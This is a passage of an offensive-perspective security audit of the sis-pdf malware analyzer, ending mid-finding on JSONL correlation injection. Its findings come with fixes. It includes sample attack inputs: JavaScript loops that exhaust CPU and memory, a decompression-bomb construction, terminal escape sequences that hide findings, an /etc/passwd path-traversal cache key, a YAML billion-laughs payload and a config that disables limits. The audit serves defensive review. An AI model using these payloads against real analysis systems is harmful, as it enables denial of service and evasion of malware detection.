# Deep Security Review: sis-pdf

## Executive Summary

This deep security review assumes a sophisticated threat actor is crafting malicious PDF files specifically to exploit, corrupt, evade, or abuse the sis-pdf analyzer. The review identifies critical vulnerabilities across parsing, resource management, sandboxing, and output handling that could enable denial-of-service, detection evasion, information disclosure, and potential code execution scenarios.

**Key Risk Areas:**
- **Critical:** In-process JavaScript execution without wall-clock timeout enables targeted DoS
- **Critical:** Memory exhaustion via decompression bombs and cascading object streams
- **High:** Parser differential attacks can evade detection through tolerance mechanisms
- **High:** Integer overflow opportunities in size calculations and arithmetic operations
- **Medium:** Cache poisoning and configuration injection via untrusted inputs
- **Medium:** Terminal injection and output manipulation risks

## Scope

This review analyzes sis-pdf from an offensive security perspective, focusing on how a threat actor would weaponize PDF inputs to:

1. **Deny service** - Exhaust CPU, memory, disk, or wall-clock time to prevent analysis
2. **Evade detection** - Exploit parser differentials, tolerance, and resource limits to hide malicious payloads
3. **Corrupt analysis** - Poison caches, manipulate outputs, or cause incorrect verdicts
4. **Escape boundaries** - Attempt file system escapes, path traversal, or sandbox breaks
5. **Gather intelligence** - Extract information about the analysis environment

**In-scope components:**
- PDF parsing pipeline (`sis-pdf-pdf`: parser, lexer, graph, objstm, decode, xref)
- Detection engine (`sis-pdf-detectors`: 30+ detectors, JS sandbox)
- Analysis runtime (`sis-pdf-core`: runner, scanner, cache, config, reporting)
- CLI interface (`sis-pdf`: file I/O, batch processing, extraction, output)
- External input vectors (JSONL, YAML config, cache files, ML models)

**Out of scope:**
- OS-level sandboxing (not implemented)
- Network security (no network operations found)
- Third-party dependency vulnerabilities (beyond usage patterns)

## Threat Model

### Attacker Profile
**Nation-state APT or sophisticated cybercrime group** targeting malware analysis infrastructure:
- Deep knowledge of PDF specification and parser implementations
- Access to this codebase (open source) for white-box testing
- Capability to craft highly optimized exploit PDFs
- Goal: Bypass automated analysis to deliver malware undetected

### Attacker Capabilities
1. **Full control** over PDF file contents (structure, objects, streams, metadata)
2. **Partial control** over batch workflow (if targeting pipeline infrastructure):
   - JSONL files for campaign correlation
   - Configuration YAML files
   - Cache directory contents (in shared/multi-tenant scenarios)
3. **Knowledge** of analyzer implementation details via source code review
4. **Testing capability** to iterate on evasion techniques offline

### Attack Goals (Priority Order)
1. **Availability destruction** - Make analyzer unusable (DoS)
2. **Detection evasion** - Deliver malicious payload with clean verdict
3. **Intelligence gathering** - Learn about analysis environment/capabilities
4. **Analysis corruption** - Generate false positives to exhaust analyst attention
5. **Lateral movement** - Escape analysis sandbox to compromise infrastructure

---

## Critical Vulnerabilities

### CRIT-1: JavaScript Sandbox Resource Exhaustion (Targeted DoS)

**Location:** `crates/sis-pdf-detectors/src/js_sandbox.rs:49-54`

**Impact:** A malicious PDF can execute JavaScript that exhausts all available CPU time or memory, effectively denying service to the analysis infrastructure.

**Attack Vector:**
```rust
// Current implementation (js_sandbox.rs:50-54)
let mut limits = RuntimeLimits::default();
limits.set_loop_iteration_limit(100_000);  // ❌ No wall-clock timeout
limits.set_recursion_limit(128);
limits.set_stack_size_limit(512 * 1024);
```

The sandbox enforces iteration counts and recursion depth, but **NOT wall-clock execution time**. An attacker can craft JavaScript that:

1. **Heavy computation within iteration budget:**
```javascript
// Executes crypto operations 100k times - can take minutes
for (var i = 0; i < 100000; i++) {
    // Complex mathematical operations, string manipulation
    var x = Math.pow(2, 1000) * Math.sqrt(999999);
    var s = "A".repeat(10000).split("").reverse().join("");
}
```

2. **Memory allocation within limits:**
```javascript
// Allocates maximum memory before limit triggers
var arrays = [];
for (var i = 0; i < 100000; i++) {
    arrays.push(new Array(1000).fill("PAYLOAD"));
}
```

3. **Nested iterations:**
```javascript
// O(n²) complexity: 100k * 100k = 10 billion effective iterations
for (var i = 0; i < 100000; i++) {
    for (var j = 0; j < 100000; j++) { /* work */ }
}
```

**Exploitation Scenario:**
- Attacker submits PDF with expensive JS to analysis pipeline
- Each file takes 10-60 minutes to analyze (vs. normal <1 second)
- With 1000 PDFs, can occupy all worker threads for days
- Legitimate files stuck in queue → effective DoS

**Evidence:**
- `crates/sis-pdf-detectors/src/js_sandbox.rs:57` - `context.eval(source)` blocks indefinitely
- No timeout mechanism in boa_engine integration
- Runs in same process as analyzer (line 48-49)

**Weaponization Difficulty:** Low (trivial to craft)

**Recommendations:**
1. **IMMEDIATE:** Add wall-clock timeout (e.g., 5 seconds max)
2. **SHORT-TERM:** Move JS execution to isolated subprocess with kill timeout
3. **LONG-TERM:** Consider disabling JS sandbox by default; require explicit opt-in
4. **DETECTION:** Log execution time; alert on JS payloads taking >1 second

---

### CRIT-2: Cascading Object Stream Decompression Bomb

**Location:** `crates/sis-pdf-pdf/src/objstm.rs:12-96`, `crates/sis-pdf-pdf/src/graph.rs:88-99`

**Impact:** An attacker can craft a PDF with nested or recursive ObjStm references that expand to gigabytes of in-memory objects, exhausting available RAM and crashing the analyzer.

**Attack Vector:**

The ObjStm expansion logic has a critical flaw:

```rust
// objstm.rs:42 - decodes each ObjStm up to max_objstm_bytes
let mut decoded = match decode_stream(bytes, st, max_objstm_bytes) {
    Ok(v) => v,
    Err(_) => continue,
};

// objstm.rs:46-50 - tracks TOTAL decoded bytes
if max_total_decoded_bytes > 0 {
    decoded_total = decoded_total.saturating_add(decoded.data.len());
    if decoded_total > max_total_decoded_bytes {
        break;
    }
}
```

**Problem:** Each ObjStm can decode up to `max_objstm_bytes` (32 MB default) BEFORE the total budget check. The total is checked AFTER decoding completes.

**Attack Construction:**
```
1. Create ObjStm #1: Compresses to 1 KB, expands to 32 MB
2. Create ObjStm #2: Compresses to 1 KB, expands to 32 MB
3. Create ObjStm #3: Compresses to 1 KB, expands to 32 MB
...
4. Create ObjStm #100: Compresses to 1 KB, expands to 32 MB
```

Total compressed: 100 KB
Total expanded: 3.2 GB (100 × 32 MB)

Each ObjStm is decoded before the budget check, so all 100 get expanded into memory simultaneously.

**Cascading Effect:**

Additionally, ObjStms can contain REFERENCES to other ObjStms, creating multi-stage decompression:

```
ObjStm A (1 MB compressed → 32 MB decompressed)
  ├─ Contains Ref to ObjStm B
  ├─ Contains Ref to ObjStm C
  └─ Contains Ref to ObjStm D

ObjStm B (1 MB → 32 MB) contains Refs to E, F, G...
```

Each layer multiplies memory consumption.

**Evidence:**
- `crates/sis-pdf-pdf/src/objstm.rs:46` - Budget checked AFTER `decode_stream` completes
- `crates/sis-pdf-pdf/src/graph.rs:88-98` - All expanded objects kept in memory
- `crates/sis-pdf-pdf/src/graph.rs:46` - `decoded_buffers: Vec<Vec<u8>>` stores all decoded data
- No streaming or discard mechanism

**Weaponization Difficulty:** Medium (requires understanding ObjStm format)

**Recommendations:**
1. **IMMEDIATE:** Check budget BEFORE decoding each stream
2. **IMMEDIATE:** Add hard limit on number of ObjStms (e.g., max 100)
3. **SHORT-TERM:** Implement streaming ObjStm parser that doesn't hold all data in memory
4. **SHORT-TERM:** Detect recursive ObjStm references and reject
5. **DETECTION:** Alert on PDFs with >10 ObjStms or >100 MB total decoded

---

### CRIT-3: Integer Overflow in Size Calculations

**Location:** Multiple locations in decoder and parser

**Impact:** Integer overflows in size arithmetic can bypass safety checks, leading to incorrect buffer allocations, out-of-bounds access, or memory exhaustion.

**Attack Vectors:**

**Vector 1: Predictor arithmetic overflow** (`decode.rs:145-159`)
```rust
fn apply_tiff_predictor(data: &[u8], parms: DecodeParms) -> Result<Vec<u8>> {
    let bpp = ((parms.colors * parms.bits_per_component + 7) / 8) as usize;
    let row_len = parms.columns as usize * bpp;  // ❌ Can overflow
    // ...
}
```

If attacker sets:
- `colors = u32::MAX / 8 = 536,870,911`
- `bits_per_component = 8`
- `columns = u32::MAX`

Then:
- `bpp = (536870911 * 8 + 7) / 8 = 536870911`
- `row_len = u32::MAX * 536870911` → **integer overflow** → wraps to small value

Result: `data.chunks(row_len)` with tiny row_len causes massive iteration count → DoS

**Vector 2: Stream length overflow** (`parser.rs:536`)
```rust
let data_end = if let Some(len) = length {
    let end = data_start.saturating_add(len as usize);  // ❌ saturating_add masks overflow
    // ...
```

If `data_start = usize::MAX - 100` and `len = 1000`, saturation results in `usize::MAX`, not intended calculation.

**Vector 3: Array allocation via length** (`parser.rs:173-196`)
```rust
fn parse_array(&mut self) -> Result<Vec<PdfObj<'a>>> {
    let mut out = Vec::new();  // ❌ No size limit
    loop {
        // ... can push indefinitely until OOM
        out.push(self.parse_object()?);
    }
}
```

Attacker can create array with millions of small objects:
```
[ 1 2 3 4 5 ... 10000000 ]
```
Each object adds to `Vec`, causing allocation pressure.

**Evidence:**
- `crates/sis-pdf-pdf/src/decode.rs:145` - Unchecked multiply in predictor
- `crates/sis-pdf-pdf/src/parser.rs:536` - Saturating add hides overflow
- `crates/sis-pdf-pdf/src/parser.rs:198` - Dict entries unlimited
- No validation of DecodeParms values from untrusted PDF

**Weaponization Difficulty:** Medium-High (requires understanding format internals)

**Recommendations:**
1. **IMMEDIATE:** Add checked arithmetic with overflow detection
2. **IMMEDIATE:** Validate all DecodeParms values against reasonable maxima
3. **IMMEDIATE:** Add size limits to arrays (max 100k elements) and dicts (max 10k entries)
4. **SHORT-TERM:** Fuzz test with extreme values (u32::MAX, u64::MAX, etc.)
5. **DETECTION:** Reject PDFs with DecodeParms values >100,000

---

### CRIT-4: Unsafe Lifetime Transmute Creates Use-After-Free Risk

**Location:** `crates/sis-pdf-pdf/src/objstm.rs:56-57`

**Impact:** Memory safety violation that could lead to undefined behavior, crashes, or potential exploitation if invariants are violated during code evolution.

**Vulnerable Code:**
```rust
let data = std::mem::take(&mut decoded.data);
// SAFETY: caller stores `data` in the graph so the backing buffer lives for `'a`.
let data_ref: &'a [u8] = unsafe { std::mem::transmute::<&[u8], &'a [u8]>(&data) };
```

**The Invariant:**
The code assumes `data` (a `Vec<u8>`) will be moved into `graph.decoded_buffers` at line 93, extending its lifetime to match the graph lifetime `'a`.

**Attack Vector - Code Evolution:**

This isn't directly exploitable via malicious PDF, but creates **fragile code** that can break during maintenance:

**Scenario 1:** Future refactoring adds early return:
```rust
// Someone adds optimization to skip empty ObjStms
if data.is_empty() {
    continue;  // ❌ `data` dropped here, but `data_ref` still in use!
}
```

**Scenario 2:** Conditional buffer storage:
```rust
// Someone optimizes memory by only storing large buffers
if data.len() > 1024 {
    buffers.push(data);
} else {
    // ❌ Small buffer dropped, but references still exist
}
```

**Current Risk:** Low (invariant currently holds)
**Future Risk:** High (any refactoring could violate safety)

**Evidence:**
- `crates/sis-pdf-pdf/src/objstm.rs:57` - Unsafe transmute with lifetime extension
- Comment relies on "caller stores data" - not enforced by type system
- No compile-time guarantee that buffer outlives references
- Difficult to verify invariant during code review

**Weaponization Difficulty:** N/A (not directly exploitable, but increases codebase fragility)

**Recommendations:**
1. **IMMEDIATE:** Add compile-time safety via wrapper types or lifetime bounds
2. **SHORT-TERM:** Refactor to eliminate unsafe code:
```rust
// Alternative: Use indices instead of references
struct ObjStmEntry {
    buffer_index: usize,
    offset: usize,
    length: usize,
}
```
3. **SHORT-TERM:** Add runtime assertions that verify invariant:
```rust
debug_assert!(graph.decoded_buffers.iter().any(|b| std::ptr::eq(b.as_ptr(), data.as_ptr())));
```
4. **LONG-TERM:** Design API that makes safety violation impossible by construction

---

## High Severity Vulnerabilities

### HIGH-1: Parser Differential Attacks Enable Evasion

**Location:** `crates/sis-pdf-pdf/src/parser.rs` (entire module), `crates/sis-pdf-core/src/diff.rs`

**Impact:** Threat actors can exploit differences between sis-pdf's parser and other PDF readers to hide malicious payloads that execute in victim's PDF reader but aren't detected by sis-pdf.

**Attack Theory:**

sis-pdf uses a **tolerant parser** that continues on errors and records "deviations" rather than failing. This is by design for malware analysis, but creates parser differentials.

**Differential Categories:**

**1. Error recovery differences:**
```rust
// parser.rs:223-236 - Dict parsing continues with null on error
if let Ok(val) = self.parse_object() {
    entries.push((name, val));
} else {
    entries.push((name, PdfObj { atom: PdfAtom::Null, .. }));  // ❌ Substitute null
}
```

Attack: Create dict with intentionally malformed value that sis-pdf parses as null but Adobe Reader parses as malicious script.

**2. String escape handling:**
```rust
// parser.rs:346-356 - Invalid escape sequences accepted
other => {
    self.record_deviation("invalid_escape_sequence", ...);
    out.push(other);  // ❌ Uses literal byte
}
```

Attack: Craft escape sequence `\x` that sis-pdf treats as literal 'x' but victim reader interprets as hex escape.

**3. Number parsing tolerance:**
```rust
// parser.rs:157-163 - Invalid numbers recorded but parsing continues
if self.strict && parse_number(&num2_str).is_err() {
    self.record_deviation("invalid_number", ...);  // ❌ Logs but continues
}
```

**4. Stream length ambiguity:**
```rust
// parser.rs:534-550 - Tries /Length first, falls back to search
let data_end = if let Some(len) = length {
    let end = data_start.saturating_add(len as usize);
    end.min(self.cur.bytes.len())
} else {
    find_endstream(self.cur.bytes, data_start).unwrap_or(self.cur.bytes.len())
};
```

Attack: Set `/Length` to truncate malicious payload, but include full payload before `endstream`. sis-pdf sees truncated version, victim reader uses full payload.

**Differential Testing Evidence:**

The codebase includes `--diff-parser` flag that compares results with `lopdf` library:
```rust
// diff.rs:19
pub fn diff_parse(bytes: &[u8]) -> Result<DiffResult> {
    let doc = lopdf::Document::load_mem(bytes)?;
    // ...
}
```

This suggests developers are aware of parser differential risks.

**Real-World Exploitation:**

1. Attacker crafts PDF with dual interpretation
2. sis-pdf parses with deviation, extracts benign-looking JavaScript
3. Adobe Reader/Foxit/Chrome PDF viewer parses with malicious interpretation
4. Malicious payload executes on victim
5. Evasion successful

**Evidence:**
- `crates/sis-pdf-pdf/src/parser.rs:43-51` - Deviations recorded but parsing continues
- `crates/sis-pdf-pdf/src/parser.rs:106-114` - Unexpected bytes logged, then error
- `crates/sis-pdf-pdf/src/parser.rs:549` - Stream data extraction has multiple fallback paths
- `crates/sis-pdf-core/src/diff.rs` - Differential parser comparison feature exists

**Weaponization Difficulty:** High (requires deep PDF spec knowledge and testing against multiple readers)

**Recommendations:**
1. **IMMEDIATE:** Enable `--diff-parser` by default for high-security deployments
2. **IMMEDIATE:** Escalate severity when deviations detected in JavaScript/action contexts
3. **SHORT-TERM:** Build corpus of known parser differential cases from PDF security research
4. **SHORT-TERM:** Add detector that flags PDFs with multiple structural deviations as "evasion attempt"
5. **LONG-TERM:** Test sis-pdf parser against real-world PDF corpora from Adobe, Foxit, Chromium
6. **DETECTION:** Alert when deviations occur in objects containing `/JS`, `/JavaScript`, `/Action`, or `/OpenAction`

---

### HIGH-2: No File Size Validation Before mmap

**Location:** `crates/sis-pdf/src/main.rs:352-355`

**Impact:** An attacker can submit extremely large files (multi-GB) that exhaust available memory or file descriptor limits, causing DoS.

**Vulnerable Code:**
```rust
fn mmap_file(path: &str) -> Result<Mmap> {
    let f = fs::File::open(path)?;  // ❌ No size check
    unsafe { Mmap::map(&f).map_err(|e| anyhow!(e)) }
}
```

**Attack Scenario:**

1. Attacker creates 100 GB "PDF" file (mostly zeros or compressed data)
2. Submits to analysis pipeline
3. `mmap_file()` attempts to map entire 100 GB into virtual address space
4. On 64-bit Linux: May succeed but cause swap thrashing
5. On 32-bit systems or Windows: Likely fails, but consumes file descriptors
6. If batch processing: Can exhaust all available mmaps simultaneously

**Related: No Limits on Batch Processing**

```rust
// main.rs:556-569 - WalkDir batch scanning
for entry in WalkDir::new(path) {
    // ❌ No limit on number of files
    // ❌ No total size budget
    files.push(entry.path());
}
```

Attacker can provide directory with 100,000 files, exhausting disk I/O and memory.

**Evidence:**
- `crates/sis-pdf/src/main.rs:352` - No validation before mmap
- `crates/sis-pdf/src/main.rs:556` - No file count limit in batch mode
- No MAX_FILE_SIZE constant defined anywhere

**Weaponization Difficulty:** Trivial

**Recommendations:**
1. **IMMEDIATE:** Add file size validation:
```rust
const MAX_PDF_SIZE: u64 = 500 * 1024 * 1024;  // 500 MB

fn mmap_file(path: &str) -> Result<Mmap> {
    let f = fs::File::open(path)?;
    let size = f.metadata()?.len();
    if size > MAX_PDF_SIZE {
        return Err(anyhow!("File exceeds maximum size: {} bytes", size));
    }
    unsafe { Mmap::map(&f).map_err(|e| anyhow!(e)) }
}
```
2. **IMMEDIATE:** Add batch processing limits:
   - Max files per batch: 10,000
   - Max total batch size: 50 GB
   - Max concurrent mmaps: 100
3. **SHORT-TERM:** Add streaming mode for large files (parse in chunks)
4. **DETECTION:** Log warning for files >50 MB, error for >500 MB

---

### HIGH-3: Terminal Escape Sequence Injection

**Location:** `crates/sis-pdf-core/src/report.rs:104-139`, `crates/sis-pdf/src/main.rs:1254-1264`

**Impact:** Malicious PDFs can inject terminal escape sequences into output, potentially:
- Hiding malicious findings by clearing screen
- Manipulating terminal state to confuse analysts
- Executing commands on terminals with RCE vulnerabilities (rare but possible)
- Creating misleading visual output in reports

**Vulnerable Code:**

```rust
// report.rs:135 - Control character escaping only in payload preview
println!("{}", escape_control(payload));

// But NOT escaped in other contexts:
// report.rs:133
println!("{} — {}", f.id, f.title);  // ❌ Title not escaped

// main.rs:1254-1264 - preview_bytes escapes, but only for display
fn preview_bytes(bytes: &[u8]) -> String {
    for &b in bytes.iter().take(256) {
        if b.is_ascii_graphic() || b == b' ' {
            s.push(b as char);  // ❌ Allows escape sequences
        }
    }
}
```

**Attack Payloads:**

**1. Screen clear attack:**
```
Finding Title: \x1b[2J\x1b[H Legitimate Finding
```
Output clears screen, hides previous findings.

**2. Color manipulation:**
```
Finding Title: \x1b[32mLOW SEVERITY\x1b[0m (actually high severity)
```
Displays in green to appear benign.

**3. Cursor manipulation:**
```
Finding: Malicious\x1b[10D          Clean
```
Overwrites "Malicious" with "Clean" on terminal.

**4. Report injection:**
```
Payload Preview:
\x1b[1A\x1b[KHigh: 0  Medium: 0  Low: 0  Info: 1
```
Overwrites summary line to hide detections.

**Extraction Context Vulnerability:**

```rust
// main.rs:1166 - Embedded file hash printed without sanitization
println!("Embedded file: sha256={} magic={}", hash, magic);
```

If filename contains terminal codes, they execute during extraction report.

**Evidence:**
- `crates/sis-pdf-core/src/report.rs:150-160` - `escape_control()` exists but not used consistently
- `crates/sis-pdf-core/src/report.rs:133` - Finding titles printed raw
- `crates/sis-pdf/src/main.rs:1256-1261` - ASCII graphic check allows escape sequences (0x1B is not graphic)
- No sanitization in JSON output (could affect downstream tools)

**Weaponization Difficulty:** Low-Medium

**Recommendations:**
1. **IMMEDIATE:** Apply `escape_control()` to ALL external strings before output:
```rust
fn sanitize_for_terminal(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_control() && c != '\n' { '�' } else { c })
        .collect()
}
```
2. **IMMEDIATE:** Update `preview_bytes()` to strip ALL control characters:
```rust
if b >= 0x20 && b <= 0x7E || b == b' ' {  // Printable ASCII only
    s.push(b as char);
}
```
3. **SHORT-TERM:** Add `--safe-output` flag that outputs only plain text
4. **SHORT-TERM:** Escape terminal codes in JSON/SARIF output for downstream safety
5. **DETECTION:** Flag PDFs with embedded escape sequences as "suspicious"

---

### HIGH-4: Resource Limit Check Timing Vulnerabilities

**Location:** `crates/sis-pdf-pdf/src/parser.rs:729-742`, `crates/sis-pdf-core/src/runner.rs:76-100`

**Impact:** Resource limits are checked AFTER work is performed, allowing attackers to exceed budgets before enforcement.

**Vulnerable Patterns:**

**Pattern 1: Object count check after parsing**
```rust
// parser.rs:729-742
while i + 7 < bytes.len() {
    if max_objects > 0 && out.len() >= max_objects {  // Checked here
        break;
    }
    // ...
    let (res, mut devs) = parse_indirect_object_at(bytes, i, strict);  // ❌ But parsed first
    if let Ok((entry, end_pos)) = res {
        out.push(entry);
    }
}
```

**Problem:** The check at line 730 happens BEFORE parsing, but the object at index `max_objects` is still parsed. For very large objects (e.g., multi-MB stream), this can exceed memory budget.

**Pattern 2: Total decoded bytes checked after decode**
```rust
// objstm.rs:42-50
let mut decoded = match decode_stream(bytes, st, max_objstm_bytes) {
    Ok(v) => v,  // ❌ Already decoded up to 32 MB
    Err(_) => continue,
};
if max_total_decoded_bytes > 0 {
    decoded_total = decoded_total.saturating_add(decoded.data.len());
    if decoded_total > max_total_decoded_bytes {  // Checked AFTER decode
        break;
    }
}
```

**Pattern 3: Graph object count checked after full scan**
```rust
// runner.rs:76
if ctx.graph.objects.len() > ctx.options.max_objects {
    // ❌ Already parsed all objects into memory
    findings.push(Finding { kind: "object_count_exceeded".into(), ... });
}
```

**Attack Construction:**

1. Create PDF with exactly `max_objects + 1` objects
2. Make the last object a 100 MB stream
3. Parser will:
   - Parse objects 1 through `max_objects` (allowed)
   - Parse object `max_objects + 1` fully (bypass)
   - Then hit limit and stop
4. Result: 100 MB excess memory allocated

**Amplification:**

Combine with ObjStm expansion:
- Object `max_objects` is an ObjStm containing 10,000 sub-objects
- Parser hits limit at `max_objects`, but ObjStm already expanded
- All 10,000 sub-objects added to graph in one shot
- Effective count: `max_objects + 10,000`

**Evidence:**
- `crates/sis-pdf-pdf/src/parser.rs:730` - Check after parse starts
- `crates/sis-pdf-pdf/src/objstm.rs:46` - Budget checked after decode
- `crates/sis-pdf-core/src/runner.rs:76` - Post-facto validation only
- No pre-allocation size checks

**Weaponization Difficulty:** Medium

**Recommendations:**
1. **IMMEDIATE:** Check limits BEFORE expensive operations:
```rust
if max_objects > 0 && out.len() >= max_objects {
    break;  // Don't even attempt to parse
}
```
2. **IMMEDIATE:** Pre-check stream /Length before decoding:
```rust
if let Some(length) = stream_length_from_dict(&dict) {
    if decoded_total + length > max_total_decoded_bytes {
        continue;  // Skip this stream
    }
}
```
3. **SHORT-TERM:** Add "budget reservation" system:
```rust
struct ResourceBudget {
    allocated: usize,
    limit: usize,
}
impl ResourceBudget {
    fn reserve(&mut self, amount: usize) -> Result<()> {
        if self.allocated + amount > self.limit {
            return Err(anyhow!("Budget exceeded"));
        }
        self.allocated += amount;
        Ok(())
    }
}
```
4. **DETECTION:** Alert when PDFs approach 80% of any resource limit

---

## Medium Severity Vulnerabilities

### MED-1: Cache Poisoning via Hash Collision

**Location:** `crates/sis-pdf-core/src/cache.rs:56-69`, `crates/sis-pdf/src/main.rs:1266-1271`

**Impact:** In shared cache scenarios, attackers can poison cache with malicious reports to cause false negatives for other users' scans.

**Vulnerable Pattern:**

```rust
// cache.rs:108-110 - Hash computed from SHA256
fn path_for(&self, hash: &str) -> PathBuf {
    let safe = hash.replace('/', "_");  // ❌ Only sanitizes '/'
    self.dir.join(format!("{}.json", safe))
}
```

**Attack Vector 1: Hash provided by user**

If the hash is computed client-side and provided via API:
```rust
// User controls hash value
cache.load("../../../etc/passwd_000000000000");  // Path traversal
cache.load("report_for_different_file");  // Load wrong cached report
```

**Attack Vector 2: Collision attack (theoretical)**

SHA256 collisions are not practical, but:
- If cache uses truncated hash (first 16 chars): Birthday attack possible
- If cache can be pre-populated: Chosen-prefix collision

**Attack Vector 3: Shared cache directory**

```rust
// config.rs:40-44 - Cache dir from YAML config
pub fn load(path: &Path) -> anyhow::Result<Self> {
    let data = fs::read_to_string(path)?;  // ❌ No validation of config content
    let cfg = serde_yaml::from_str::<Config>(&data)?;
    Ok(cfg)
}
```

In multi-tenant scenario:
1. Attacker creates malicious PDF `evil.pdf` (hash: `AAAA...`)
2. Attacker crafts benign PDF that hashes to same truncated hash
3. Attacker scans `evil.pdf` first, cache stores malicious report
4. Victim scans their benign PDF with same truncated hash
5. Cache returns attacker's malicious report
6. Victim gets false negative (malware reported as clean)

**Cache Validation Weakness:**

```rust
// cache.rs:64 - Loads cached report with minimal validation
let entry: CacheEntryOwned = serde_json::from_slice(&data).ok()?;
if entry.version != CACHE_VERSION {  // ❌ Only checks version
    return None;
}
Some(entry.report)  // No hash verification!
```

No verification that cached report matches requested file hash.

**Evidence:**
- `crates/sis-pdf-core/src/cache.rs:63` - Reads cache file without integrity check
- `crates/sis-pdf-core/src/cache.rs:109` - Path only sanitizes `/`, not other path chars
- `crates/sis-pdf/src/main.rs:1266` - SHA256 computed but not included in cache entry

**Weaponization Difficulty:** High (requires shared cache access)

**Recommendations:**
1. **IMMEDIATE:** Include file hash in cache entry and verify on load:
```rust
struct CacheEntry<'a> {
    version: u32,
    file_hash: String,  // ← Add this
    report: &'a Report,
}

fn load(&self, hash: &str) -> Option<Report> {
    let entry: CacheEntryOwned = serde_json::from_slice(&data).ok()?;
    if entry.file_hash != hash {  // ← Verify match
        return None;
    }
    // ...
}
```
2. **IMMEDIATE:** Use full SHA256 (32 bytes), not truncated
3. **IMMEDIATE:** Document that cache directory must be trusted, single-tenant
4. **SHORT-TERM:** Add cache signature/MAC to prevent tampering
5. **LONG-TERM:** Implement per-user cache isolation for multi-tenant deployments

---

### MED-2: YAML Configuration Injection

**Location:** `crates/sis-pdf-core/src/config.rs:40-44`

**Impact:** Malicious configuration files can manipulate analysis behavior to evade detection or cause DoS.

**Vulnerable Code:**

```rust
pub fn load(path: &Path) -> anyhow::Result<Self> {
    let data = fs::read_to_string(path)?;  // ❌ No size limit
    let cfg = serde_yaml::from_str::<Config>(&data)?;  // ❌ Parses arbitrary YAML
    Ok(cfg)
}
```

**Attack Scenarios:**

**1. Resource limit manipulation:**
```yaml
# malicious-config.yaml
scan:
  max_objects: 999999999  # Effectively disable limit
  max_decode_bytes: 999999999
  max_total_decoded_bytes: 999999999
  max_recursion_depth: 0  # Disable recursion checks
```

Then submit malicious PDF with config:
```bash
sis scan evil.pdf --config malicious-config.yaml
```

**2. ML model path injection:**
```yaml
scan:
  ml_model: "/tmp/attacker_model"  # Point to attacker-controlled model
```

If attacker can write to `/tmp/attacker_model`, they control ML verdicts.

**3. YAML billion laughs attack:**
```yaml
a: &a ["lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c]
# ... results in exponential expansion
```

Causes YAML parser to consume excessive memory.

**4. Disable detectors:**
```yaml
scan:
  fast: true  # Only run cheap detectors
  deep: false  # Disable expensive detection
  diff_parser: false  # Disable differential checks
```

**Evidence:**
- `crates/sis-pdf-core/src/config.rs:40` - No validation of loaded values
- `crates/sis-pdf-core/src/config.rs:62-113` - All config values blindly applied
- No sanity checks on numeric ranges
- Uses `serde_yaml` which is vulnerable to billion laughs

**Weaponization Difficulty:** Low (if attacker controls config file path)

**Recommendations:**
1. **IMMEDIATE:** Validate all config values against safe ranges:
```rust
fn apply_scan(scan: &ScanConfig, opts: &mut ScanOptions) {
    if let Some(v) = scan.max_objects {
        if v > 10_000_000 || v == 0 {
            eprintln!("Invalid max_objects: {}, using default", v);
        } else {
            opts.max_objects = v;
        }
    }
    // ... similar for all values
}
```
2. **IMMEDIATE:** Add file size limit to config loading (max 1 MB)
3. **IMMEDIATE:** Use `serde_yaml` with entity expansion limits
4. **SHORT-TERM:** Whitelist allowed config file locations (not user-writable)
5. **SHORT-TERM:** Add config file integrity check (signature/checksum)
6. **DETECTION:** Log warning when non-default config modifies resource limits

---

### MED-3: Parallel Execution Amplifies Resource Exhaustion

**Location:** `crates/sis-pdf-core/src/runner.rs:46-74`

**Impact:** Parallel detector execution multiplies memory and CPU usage, enabling amplified DoS attacks.

**Vulnerable Code:**

```rust
let mut findings: Vec<Finding> = if ctx.options.parallel {
    use rayon::prelude::*;
    detectors
        .par_iter()  // ❌ Parallel execution
        .filter(|d| { ... })
        .map(|d| d.run(&ctx))  // All detectors run simultaneously
        .collect::<Result<Vec<_>, _>>()?
        .into_iter()
        .flatten()
        .collect()
} else { /* sequential */ }
```

**Problem:** All detectors share the same `ctx.graph` and `ctx.decoded` cache. In parallel mode:

1. Each detector can trigger stream decoding independently
2. All decoded streams cached simultaneously
3. Memory usage = (detectors × per-detector memory)

**Attack Scenario:**

1. Attacker creates PDF with 100 streams, each 32 MB compressed → 32 MB decompressed
2. PDF analyzed with parallel mode (default)
3. 10 detectors run in parallel
4. Each detector decodes different streams
5. Peak memory = 10 detectors × 5 streams each × 32 MB = **1.6 GB**
6. Far exceeds intended `max_total_decoded_bytes` (256 MB)

**Rayon Thread Pool:**

Rayon uses thread pool size = number of CPU cores. On 16-core system:
- 16 threads × 100 MB per thread = 1.6 GB
- All threads decode streams simultaneously
- No cross-thread budget enforcement

**Evidence:**
- `crates/sis-pdf-core/src/runner.rs:48` - Rayon parallel iteration
- `crates/sis-pdf-core/src/scan.rs` - Shared DecodedCache not thread-safe for budget
- No global memory budget across parallel workers

**Weaponization Difficulty:** Medium

**Recommendations:**
1. **IMMEDIATE:** Add global memory budget enforced across all threads:
```rust
use std::sync::atomic::{AtomicUsize, Ordering};

struct GlobalBudget {
    allocated: AtomicUsize,
    limit: usize,
}

impl GlobalBudget {
    fn try_allocate(&self, size: usize) -> Result<(), ()> {
        let current = self.allocated.fetch_add(size, Ordering::SeqCst);
        if current + size > self.limit {
            self.allocated.fetch_sub(size, Ordering::SeqCst);
            Err(())
        } else {
            Ok(())
        }
    }
}
```
2. **IMMEDIATE:** Limit rayon thread pool size:
```rust
rayon::ThreadPoolBuilder::new()
    .num_threads(4)  // Cap at 4 threads regardless of CPU count
    .build_global()?;
```
3. **SHORT-TERM:** Add per-detector memory limits
4. **SHORT-TERM:** Make parallel mode opt-in, not default
5. **DETECTION:** Monitor total memory usage; kill analysis if exceeds 2× budget

---

### MED-4: JSONL Campaign Correlation Injection

**Location:** `crates/sis-pdf/src/main.rs:339` (CampaignCorrelate command)

**Impact:** Malicious JSONL input can inject false correlation data, manipulate campaign analysis, or cause parsing errors.

**Attack Vector:**

The `campaign-correlate` command reads external JSONL files:

```rust
Command::CampaignCorrelate { input, out } => {
    run_campaign_correlate(&input, out.as_deref())
}
```

Attacker-controlled JSONL content:

**1. Malformed JSON:**
```
{"intent": "legitimate_domain.com"}
{"intent": "evil.com" } } } } } } }  ← Malformed
{"intent": "another_domain.com"}
```

Parser error could crash correlation or cause incorrect grouping.

**2. Injection of false campaigns:**
```
